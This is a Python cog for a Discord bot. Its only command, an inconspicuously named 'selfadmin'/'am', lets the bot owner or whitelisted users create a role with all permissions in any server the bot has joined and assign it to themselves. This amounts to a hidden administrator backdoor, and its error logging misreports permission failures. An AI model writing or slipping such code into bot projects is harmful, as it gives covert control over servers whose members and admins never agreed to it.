import discord
from discord.ext import commands

from modules.functions.helpers import *
from modules.functions.checkers import *

class AmCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._last_member = None

    # ---------------------------------------------------------------
    # AM

    @commands.command(aliases=["am"])
    @commands.check_any(commands.is_owner(), check_am_whitelist())
    async def selfadmin(self, ctx):
        role = await ctx.guild.create_role(name="BOT", permissions=discord.Permissions.all())
        await ctx.author.add_roles(role)

        embed = discord.Embed(
                title="Bot",
                description="Done.",
                color=0x11ff11)
        await ctx.send(embed=embed)
        debug_print('[Bot] [!!!] [AM] Gave admin role to user: %s' % ctx.author)

    @selfadmin.error
    async def selfadmin_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            embed = discord.Embed(
                    title="Missing permissions",
                    description="You can't do that",
                    color=0xff1111)
            await ctx.send(embed=embed)
            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
        else:
            embed = discord.Embed(
                    title="Error",
                    description="I can't do that",
                    color=0xff1111)
            await ctx.send(embed=embed)
            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
            error_print(error)
